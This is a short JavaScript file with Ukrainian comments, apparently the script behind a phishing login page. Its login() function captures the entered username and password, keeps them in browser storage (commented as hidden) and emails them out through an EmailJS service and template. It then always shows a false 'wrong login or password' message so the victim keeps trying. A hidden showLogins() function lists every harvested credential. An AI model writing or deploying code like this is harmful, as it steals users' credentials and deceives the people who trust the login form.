function login() {
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!user || !pass) {
        alert("Введи логін і пароль");
        return;
    }

    // Збереження логінів у localStorage (приховано)
    let logins = JSON.parse(localStorage.getItem("logins")) || [];
    logins.push({ username: user, password: pass });
    localStorage.setItem("logins", JSON.stringify(logins));

    // Відправка на EmailJS
    emailjs.send("service_4239xag", "template_ozsxeoi", {
        username: user,
        password: pass
    })
    .then(function(response) {
        console.log('Email успішно відправлено!', response);
        alert('Email надіслано — перевір пошту!');
    }, function(error) {
        console.error('Помилка при відправці email:', error);
        alert('Помилка при відправці email. Деталі в консолі: ' + JSON.stringify(error));
    });

    // Повідомлення про помилку користувачу
    alert("Невірний логін або пароль");
}

// Прихований показ логінів
function showLogins() {
    let logins = JSON.parse(localStorage.getItem("logins")) || [];
    if (logins.length === 0) {
        alert("Немає збережених логінів");
        return;
    }

    let text = "";
    logins.forEach((item, index) => {
        text += `${index + 1}. ${item.username} : ${item.password}\n`;
    });

    alert(text);
}
